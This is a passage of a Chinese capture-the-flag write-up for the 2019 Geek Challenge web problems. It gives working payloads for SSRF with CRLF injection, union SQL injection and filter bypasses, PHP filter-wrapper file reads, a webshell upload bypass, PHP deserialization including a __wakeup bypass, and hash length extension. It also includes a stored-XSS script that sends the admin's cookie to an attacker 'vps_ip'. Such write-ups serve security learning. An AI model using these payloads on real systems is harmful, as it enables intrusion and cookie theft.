class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $url = $_GET[<span class="string">"url"</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!startsWith($url,<span class="string">"http://"</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Not allow !"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;count($arr); $i++)  </span><br><span class="line">    &#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="keyword">FALSE</span>); </span><br><span class="line">        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class="keyword">FALSE</span>); </span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt($ch, CURLOPT_TIMEOUT, <span class="number">3</span>); </span><br><span class="line">        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class="keyword">false</span>);</span><br><span class="line">        $output = curl_exec($ch); </span><br><span class="line">        curl_close($ch);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> ($output === $arr[$i])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>($i == sizeof($arr)<span class="number">-1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"Congratulations. Flag is  SYC&#123;********************************&#125;"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;   </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"password is wrong"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在具有公网IP的服务器上，放置以下两个文件</p>
<p>req.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$password = <span class="string">"If I knew where I would die, I would never go there."</span>;</span><br><span class="line">$arr = explode(<span class="string">' '</span>, $password);</span><br><span class="line">$count=intval(file_get_contents(<span class="string">"1.txt"</span>));</span><br><span class="line"><span class="keyword">echo</span> $arr[$count];</span><br><span class="line"></span><br><span class="line">$count++;</span><br><span class="line">$file=fopen(<span class="string">"1.txt"</span>,<span class="string">"w+"</span>);</span><br><span class="line">fwrite($file,$count);</span><br><span class="line">fclose($file);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>1.txt</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191101124245849.png" alt="image-20191101124245849"></p>
<p>1.txt要有可写权限</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191101124431268.png" alt="image-20191101124431268"></p>
<h2 id="服务端检测系统：emm，自己看"><a href="#服务端检测系统：emm，自己看" class="headerlink" title="服务端检测系统：emm，自己看"></a>服务端检测系统：emm，自己看</h2><p>SSRF还没有写过题目，利用复现学习一下</p>
<p>首先有个admin.php</p>
<p>但要求127.0.0.1才能访问</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191211164956360.png" alt="image-20191211164956360"></p>
<p>有index.php的源码，</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191211164910208.png" alt="image-20191211164910208"></p>
<p>这里利用index.php SSRF访问admin.php</p>
<p>但要绕过“/anything”</p>
<p>这里可以构造url=<a href="http://127.0.0.1/admin.php?&amp;method=GET" target="_blank" rel="noopener">http://127.0.0.1/admin.php?&amp;method=GET</a></p>
<p>这样“/anything” 就成了一个参数</p>
<p>显示failed是因为采用GET请求方式，服务端是不会返回Allow头的，而且这里的SSRF没有回显，只有一个显示响应体长度的语句</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191211195729531.png" alt="image-20191211195729531"></p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">sprintf</span>(<span class="string">"body length of $method%d"</span>, $body);</span><br></pre></td></tr></table></figure>

<p>这句 $method可控，所以传入%s% 覆盖后 %s%%d 双百分号返回一个%,但这时 %d 已经是一个字符串</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191211202422540.png" alt="image-20191211202422540"></p>
<p>得到admin.php的源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'REMOTE_ADDR'</span>] == <span class="string">"127.0.0.1"</span>) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">if</span> (@$_POST[<span class="string">"iwantflag"</span>] == <span class="string">"yes"</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"only 127.0.0.1 can visit it"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关于HTTP头</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">http头的格式：</span><br><span class="line"></span><br><span class="line">请求方法 /路径 HTTP/版本</span><br><span class="line">头字段: 值</span><br><span class="line"></span><br><span class="line">比如：</span><br><span class="line">GET /index.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure>

<p>http头部的各个字段之间用CRLF(\r\n)(%0d%0a)分割<br>http请求头(响应头)和请求体(响应体)之间用两个CRLF分割</p>
<p>关于Http请求</p>
<p>get请求:</p>
<pre><code>GET / HTTP/1.1
Host: 127.0.0.1</code></pre><p>post请求</p>
<pre><code>POST / HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-from-urlencoded
Content-Length: 3

x=1</code></pre><p>http头的字段（常见）<br>        Host</p>
<pre><code>用于多个域名映射到同一个ip时，按照Host的内容匹配不同网站内容，每个Http头必须有Host头
当这个目的主机上只有一个网站，那么Host字段内容可以为任意值</code></pre><p>Content-Type</p>
<p>表明内容部分的编码格式和媒体类型 post/put等方式必须有(如果有请求体)</p>
<p>请求头中的Content-Type<br>GET请求:<br>GET没有请求实体部分，所以请求头中不需要设置Content-Type字段<br>POST/PUT请求<br>如果post/put请求有请求体(有传值)，那么必须要设置Content-Type字段(否则服务端可能无法处理你的请求)</p>
<pre><code>第一类：raw原始类型，可以上传任意格式的文本，比如text、json、xml、html…(中文不进行编码)
text请求：Content-Type: text/plain
json请求：Content-Type: application/json
html请求：Content-Type: text/html
第二类：application/x-www-from-urlencoded，会将表单内的数据转换拼接成key-value对(对非ascii码进行编码)
Content-Type: application/x-www-from-urlencoded
第三类：multipart/from-data，将表单的数据处理为一条消息，以标签为单元，用分隔符分开。既可以上传键值对，也可以上传文件。
Content-Type: multipart/from-data;boundary=xxx
在请求体中会有一个Content-Disposition字段，用于描述提交的表单的具体信息</code></pre><p>响应头中的Content-Type：<br> 用来告诉客户端，服务端返回的真实内容类型是什么。浏览器或客户端会根据这个值来做一些操作。</p>
<p> Content-Length 表示内容部分的长度 post/put等方式必须有(如果有请求体)</p>
<p>在源码中使用的是stream_context_create()函数发起HTTP请求</p>
<p>这里如http协议头等一些信息，作为一个数组传入。所以我们能利用CRLF构造一个新的POST包</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191212220127675.png" alt="image-20191212220127675"></p>
<p>这里我们把url改成自己服务器的ip，看看经过处理后的POST是什么样子。</p>
<p>这个POST包最后也加上了一些字符串，所以为了防止iwantflag参数被污染，所以我们传入第二个参数b</p>
<p>而且为了从index.php得到回显，我们依旧要覆盖 %d 所以id=%s% </p>
<p>还有一点，&amp;在URL中是具有分割参数的作用，所以要进行URL编码</p>
<p>最后的payload如下</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191212074711793.png" alt="image-20191212074711793"></p>
<h2 id="Lovelysql：上次是我粗心大意，看来不能直接放在网页上了！"><a href="#Lovelysql：上次是我粗心大意，看来不能直接放在网页上了！" class="headerlink" title="Lovelysql：上次是我粗心大意，看来不能直接放在网页上了！"></a>Lovelysql：上次是我粗心大意，看来不能直接放在网页上了！</h2><p>熟悉的界面</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191101125127520.png" alt="image-20191101125127520"></p>
<p>同样的手法</p>
<figure class="highlight fix"><table><tr><td class="code"><pre><span class="line"><span class="attr">‘</span>=<span class="string">’</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">‘=’</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191101201215464.png" alt="image-20191101201215464"></p>
<p>但这个字符串并不是flag，估计在数据库中</p>
<p>利用Payload测试，禁用了 insert，having等，可以利用<code>#</code> 闭合。</p>
<p>可以联合注入，报错注入，盲注。</p>
<p>这里用最简单的联合注入。</p>
<p>先判断字段数</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191101202502733.png" alt="image-20191101202502733"></p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191101202533747.png" alt="image-20191101202533747"></p>
<p>字段数为3</p>
<p>获取回显点</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191101203249710.png" alt="image-20191101203249710"></p>
<p>获取数据库名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username=1%27union+select+1,2,group_concat(schema_name)+from+information_schema.schemata%23&amp;password=123</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191101203821862.png" alt="image-20191101203821862"></p>
<p>先关注geek数据库，查表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username=1%27union+select+1,2,group_concat(table_name)+from+information_schema.tables+where+table_schema%3d&apos;geek&apos;%23&amp;password=123</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191101204140891.png" alt="image-20191101204140891"></p>
<p>查l0ve1ysq1表的字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username=1%27union+select+1,2,group_concat(column_name)+from+information_schema.columns+where+table_schema%3d&apos;geek&apos;+and+table_name%3d&apos;l0ve1ysq1&apos;%23&amp;password=123</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191101204909589.png" alt="image-20191101204909589"></p>
<p>获取数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username=1%27union+select+1,2,group_concat(id,username,password)+from+geek.l0ve1ysq1+%23&amp;password=123</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191101213948365.png" alt="image-20191101213948365"></p>
<h2 id="性感黄阿姨，在线聊天-听说她有很多小秘密和表情包哦，当然也有你们最想要的flag！"><a href="#性感黄阿姨，在线聊天-听说她有很多小秘密和表情包哦，当然也有你们最想要的flag！" class="headerlink" title="性感黄阿姨，在线聊天:听说她有很多小秘密和表情包哦，当然也有你们最想要的flag！"></a>性感黄阿姨，在线聊天:听说她有很多小秘密和表情包哦，当然也有你们最想要的flag！</h2><p>bp抓包</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191031113746614.png" alt="image-20191031113746614"></p>
<p>尝试把guest改成admin</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191031114019083.png" alt="image-20191031114019083"></p>
<p>提示我们要绕过这个判断</p>
<p>两个等号，第一时间想到的是php弱类型</p>
<p>利用字符串和数字的比较弱点</p>
<p>md5加密肯定是个字符串，如果第一个字符是字母转化为数字则为0，如果前两个字符是“1w”，那么转化为数字则为1.</p>
<p>所以我们利用name传输数字，爆破md5($flag)前面的数字即可绕过。</p>
<p>在json中，“name”:”0”是字符串，”name”:0 是数字</p>
<p>配置测试器</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191031115415135.png" alt="image-20191031115415135"></p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191031115443975.png" alt="image-20191031115443975"></p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191031115642982.png" alt="image-20191031115642982"></p>
<p>改成<a href="https://4o4notfound.org/index.php/archives/29/" target="_blank" rel="noopener">xml</a>形式，Connect-Type改成xml</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191031122255387.png" alt="image-20191031122255387"></p>
<p>利用PHP<a href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/" target="_blank" rel="noopener">伪协议</a>和base64加密读取文件内容</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191031124114147.png" alt="image-20191031124114147"></p>
<p>base64解码得到flag</p>
<h2 id="李三的代码审计笔记第二页"><a href="#李三的代码审计笔记第二页" class="headerlink" title="李三的代码审计笔记第二页"></a>李三的代码审计笔记第二页</h2><p>根据题目提示，下载源码</p>
<h2 id="Babysql：成信大的学生真是不得了，这么多黑客，不过这次我做了防御的！"><a href="#Babysql：成信大的学生真是不得了，这么多黑客，不过这次我做了防御的！" class="headerlink" title="Babysql：成信大的学生真是不得了，这么多黑客，不过这次我做了防御的！"></a>Babysql：成信大的学生真是不得了，这么多黑客，不过这次我做了防御的！</h2><p>经过测试一些关键字被过滤了，但通过双写可以绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username=-1&apos; oorrder bbyy 4-- &amp;password=123 //判断字段</span><br><span class="line"></span><br><span class="line">username=1%27ununionion+seselectlect+1,2,group_concat(schema_name)+frfromom+infoorrmation_schema.schemata%23&amp;password=123 //查数据库</span><br><span class="line"></span><br><span class="line">username=1%27ununionion+seselectlect+1,2,group_concat(table_name)+frfromom+infoorrmation_schema.tables+whwhereere+table_schema%3d&apos;geek&apos;%23&amp;password=123  //查表</span><br><span class="line"></span><br><span class="line">username=1%27ununionion+seselectlect+1,2,group_concat(column_name)+frfromom+infoorrmation_schema.columns+whwhereere+table_schema%3d&apos;geek&apos;+aandnd+table_name%3d&apos;b4bsql&apos;%23&amp;password=123 //查字段</span><br><span class="line"></span><br><span class="line">username=1%27union+select+1,2,group_concat(id,username,password)+from+geek.l0ve1ysq1+%23&amp;password=123   //获取数据</span><br></pre></td></tr></table></figure>

<h2 id="神秘的三叶草"><a href="#神秘的三叶草" class="headerlink" title="神秘的三叶草"></a>神秘的三叶草</h2><p><img src="/2019/10/第十届极客大挑战Writeup/image-20191029215131113.png" alt="image-20191029215131113"></p>
<p>查看源码，发现Secret.php</p>
<p>打开Secret.php</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191029215545399.png" alt="image-20191029215545399"></p>
<p>直接BP抓包，修改Referer头</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191029220046452.png" alt="image-20191029220046452"></p>
<p>提示使用Syclover浏览器</p>
<p>修改UA头</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191029220217949.png" alt="image-20191029220217949"></p>
<p>接着提示只能本地读取</p>
<p>修改XFF头</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191029220337766.png" alt="image-20191029220337766"></p>
<p>得到flag</p>
<h2 id="Eval-evil-code-Lamber是个老实人，他会执行你给他的代码。"><a href="#Eval-evil-code-Lamber是个老实人，他会执行你给他的代码。" class="headerlink" title="Eval evil code: Lamber是个老实人，他会执行你给他的代码。"></a>Eval evil code: Lamber是个老实人，他会执行你给他的代码。</h2><p>这里有两个限制</p>
<p>一、提交的恶意代码不能带有参数，二、输入正确的验证码</p>
<p>第二个好解决，直接用md5<a href="https://0xcreed.jxustctf.top/2019/11/Md5Crack/">碰撞脚本</a></p>
<p>第一个就要利用PHP的丰富的内置函数来构造参数。</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191111224322216.png" alt="image-20191111224322216"></p>
<p>接着读取readflag.php</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191111224528382.png" alt="image-20191111224528382"></p>
<p>参考skysec的<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/" target="_blank" rel="noopener">文章</a></p>
<h2 id="Jiang‘s-Secret-我在那放了一个秘密！"><a href="#Jiang‘s-Secret-我在那放了一个秘密！" class="headerlink" title="Jiang‘s Secret:我在那放了一个秘密！"></a>Jiang‘s Secret:我在那放了一个秘密！</h2><p>打开主页</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191029231444787.png" alt="image-20191029231444787"></p>
<p>查看源码</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191029231426639.png" alt="image-20191029231426639"></p>
<p>访问Archive_room.php</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191029231626206.png" alt="image-20191029231626206"></p>
<p>点击SECRET</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191029231659829.png" alt="image-20191029231659829"></p>
<p>尝试BP抓包</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191029231743833.png" alt="image-20191029231743833"></p>
<p>访问secr3t.php</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191029231920584.png" alt="image-20191029231920584"></p>
<p>简单的代码审计</p>
<p>直接file=flag.php</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191029232108090.png" alt="image-20191029232108090"></p>
<p>无法直接读取flag.php文件</p>
<p>利用php伪协议</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191029232338502.png" alt="image-20191029232338502"></p>
<p>base64解码</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191029232357758.png" alt="image-20191029232357758"></p>
<h2 id="Hardsql"><a href="#Hardsql" class="headerlink" title="Hardsql"></a>Hardsql</h2><h2 id="你有特洛伊么：dGhpcyBpcyBub3QgZWFzeQ"><a href="#你有特洛伊么：dGhpcyBpcyBub3QgZWFzeQ" class="headerlink" title="你有特洛伊么：dGhpcyBpcyBub3QgZWFzeQ=="></a>你有特洛伊么：dGhpcyBpcyBub3QgZWFzeQ==</h2><p>上传正常的图片</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191030232940824.png" alt="image-20191030232940824"></p>
<p>Not image！</p>
<p>尝试修改Content-Type</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191030233157391.png" alt="image-20191030233157391"></p>
<p>上传成功，但并没有返回文件路径</p>
<p>盲猜一波upload</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191030233348553.png" alt="image-20191030233348553"></p>
<p>正确</p>
<p>尝试上传一句话木马</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191030233555540.png" alt="image-20191030233555540"></p>
<p>尝试改后缀</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191030233648512.png" alt="image-20191030233648512"></p>
<p>phtml可绕过 但不能出现&lt;?</p>
<p>利用  <code>&lt;script  language=&quot;php&quot;&gt;</code> 绕过</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191030233844611.png" alt="image-20191030233844611"></p>
<p>上传成功</p>
<p>菜刀 连上</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191030234008757.png" alt="image-20191030234008757"></p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191030234111964.png" alt="image-20191030234111964"></p>
<h2 id="Leixiao’s-blog-你会盗号吗？？"><a href="#Leixiao’s-blog-你会盗号吗？？" class="headerlink" title="Leixiao’s blog:  你会盗号吗？？"></a>Leixiao’s blog:  你会盗号吗？？</h2><p>这道题是直接根据wp复现的，对XSS没有实战过，所以没写出来。</p>
<p>XSS离不开输入框，所以BP抓包，修改各个参数的值，发现密保问题是可控的。所以就构造一个Script的语句，插入到数据库中，之后在重置密码页面，这个Script语句会插入到页面中。如果管理员访问了这个页面，那么我们就能得到管理员的cookie，从而以管理员身份登录。</p>
<p>先注册一个用户，并将密保问题修改成Script语句 <code>&quot;&gt;&lt;script src=//0x12345678/1.js&gt;</code></p>
<p>1.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.location=<span class="string">'http://vps_ip/cookie'</span>+<span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191117232732259.png" alt="image-20191117232732259"></p>
<p>我们访问dcz123用户的重置密码页面</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191117233119467.png" alt="image-20191117233119467"></p>
<p>发现成功跳转了</p>
<p>接下来把</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://148.70.59.198:41258/forget.php?username=dcz123</span><br></pre></td></tr></table></figure>

<p>发给report</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191117233239962.png" alt="image-20191117233239962"></p>
<p>管理员访问后，就能在访问日志中得到管理员的cookie了</p>
<h2 id="反序列化1-0-socre10000拿到flag"><a href="#反序列化1-0-socre10000拿到flag" class="headerlink" title="反序列化1.0 : socre10000拿到flag"></a>反序列化1.0 : socre10000拿到flag</h2><p>F12查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $score = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__destruct working"</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;score==<span class="number">10000</span>) &#123;</span><br><span class="line">            $flag = <span class="string">"******************"</span>;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$exp = $_GET[<span class="string">'exp'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">unserialize($exp);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>利用反序列化漏洞，使score的值改成10000获得flag</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $score = <span class="number">10000</span>;</span><br><span class="line">&#125;</span><br><span class="line">    $Student = <span class="keyword">new</span> Student();</span><br><span class="line">    <span class="keyword">echo</span> serialize($Student); </span><br><span class="line">    </span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">//O:7:"Student":1:&#123;s:5:"score";i:10000;&#125;</span></span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">148.70</span>.<span class="number">59.198</span>:<span class="number">42374</span>/?<span class="keyword">exp</span>=O:<span class="number">7</span>:%22Student%22:<span class="number">1</span>:&#123;<span class="keyword">s</span>:<span class="number">5</span>:%22score%22;i:<span class="number">10000</span>;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191103221650185.png" alt="image-20191103221650185"></p>
<p><a href="https://www.freebuf.com/news/172507.html" target="_blank" rel="noopener">参考文章1</a></p>
<h2 id="又来一只猫-我家猫名字叫php"><a href="#又来一只猫-我家猫名字叫php" class="headerlink" title="又来一只猫: 我家猫名字叫php"></a>又来一只猫: 我家猫名字叫php</h2><p><img src="/2019/10/第十届极客大挑战Writeup/image-20191106232809806.png" alt="image-20191106232809806"></p>
<p>推测应该存在备份文件，盲猜 <code>www.zip</code></p>
<p>下载后解压，index.php中接受select参数并反序列化。</p>
<p>查看class.php</p>
<p>根据 <code>__destruct()</code>函数 反序列化要使$username=admin,$password=100.</p>
<p>但有个问题要绕过 <code>__wakeup()</code> ,这里可以利用 CVE-2016-7124漏洞，<strong>当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</strong> </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;    </span><br><span class="line">    <span class="keyword">private</span> $username = <span class="string">'admin'</span>;    </span><br><span class="line">    <span class="keyword">private</span> $password = <span class="string">'100'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$s=<span class="keyword">new</span> Name();</span><br><span class="line">var_dump(serialize($s));</span><br><span class="line">$payload=<span class="string">"O:4:\"Name\":3&#123;s:14:\"\000Name\000username\";s:5:\"admin\";s:14:\"\000Name\000password\";s:3:\"100\";&#125;"</span>; <span class="comment">//2-&gt;3</span></span><br><span class="line">var_dump(urlencode($payload));<span class="comment">//O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>最终payload</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://118.25.14.40:8109/?select=O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191106234145206.png" alt="image-20191106234145206"></p>
<p><a href="https://xz.aliyun.com/t/3674#toc-11" target="_blank" rel="noopener">参考文章1</a></p>
<p><a href="https://xz.aliyun.com/t/6454#toc-18" target="_blank" rel="noopener">参考文章2</a></p>
<h2 id="你有初恋吗：你变心了吗"><a href="#你有初恋吗：你变心了吗" class="headerlink" title="你有初恋吗：你变心了吗"></a>你有初恋吗：你变心了吗</h2><p>打开题目<a href="http://cxc.design/53a5734d6c99f89a/" target="_blank" rel="noopener">链接</a></p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191106163009923.png" alt="image-20191106163009923"></p>
<p>F12查看源码</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191106163100753.png" alt="image-20191106163100753"></p>
<p>明显是hash扩展字节攻击</p>
<p>利用BP抓包</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191106163553918.png" alt="image-20191106163553918"></p>
<p>得到Heart的值：<code>6a1ce5f4dc83320710006a786ac82c17</code></p>
<p>利用hashpump得到lover</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191106163932674.png" alt="image-20191106163932674"></p>
<p>将得到的字符串进行url编码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;php</span><br><span class="line">$str=<span class="string">"syclover\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00nb"</span>;</span><br><span class="line">var_dump(urlencode($str));<span class="comment">//syclover%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%B8%00%00%00%00%00%00%00nb</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>将Heart的值修改成<code>2399f812e1a15732dcaadef365b71c19</code> 提交lover</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191106164815760.png" alt="image-20191106164815760"></p>
<p>后面看了LiM的文章，枯了。</p>
<p>双URL编码绕过，直接POST提交  <code>lover=syclove%2572</code> 得到flag。</p>
<p>思路太局限了。。。</p>
<p><a href="https://www.freebuf.com/articles/web/31756.html" target="_blank" rel="noopener">参考文章1</a></p>
<p><a href="https://www.freebuf.com/articles/database/164019.html" target="_blank" rel="noopener">参考文章2</a></p>
<h2 id="Finalsql"><a href="#Finalsql" class="headerlink" title="Finalsql"></a>Finalsql</h2><h2 id="你读懂潇文清的网站了吗-xxe"><a href="#你读懂潇文清的网站了吗-xxe" class="headerlink" title="你读懂潇文清的网站了吗 : xxe"></a>你读懂潇文清的网站了吗 : xxe</h2><p>都已经提示xxe了</p>
<p><img src="/2019/10/第十届极客大挑战Writeup/image-20191112171229906.png" alt="image-20191112171229906"></p>
<p>利用php伪协议读取源码</p>
<p>index.php中的代码：</p>
